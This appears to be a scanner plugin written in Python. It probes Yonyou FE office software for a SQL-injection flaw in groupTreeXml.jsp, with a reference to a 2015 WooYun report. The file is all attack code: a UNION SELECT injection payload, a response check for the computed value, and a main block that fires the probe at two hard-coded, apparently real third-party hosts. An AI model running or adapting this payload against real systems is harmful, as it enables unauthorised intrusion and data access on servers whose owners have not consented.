#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://wooyun.org/bugs/wooyun-2015-093724
#__Author__ = 上善若水
#_PlugName_ = yongyou_sql Plugin
#_FileName_ = yongyou_sql.py



def assign(service, arg):
    if service == "yongyou_fe":
        return True, arg 	

def audit(arg):
    url = arg + 'system/config/groupTreeXml.jsp?type=group&SG04=1%27+UNION+ALL+SELECT+1,99999-33333,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--'
    code, head, body, errcode, _url = curl.curl(url)
    if code == 200 and '66666' in body: 
        security_hole(url)
			
    
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_fe', 'http://124.129.26.94:7742/')[1])
    audit(assign('yongyou_fe', 'http://oa.chnjcdc.com:9090/')[1])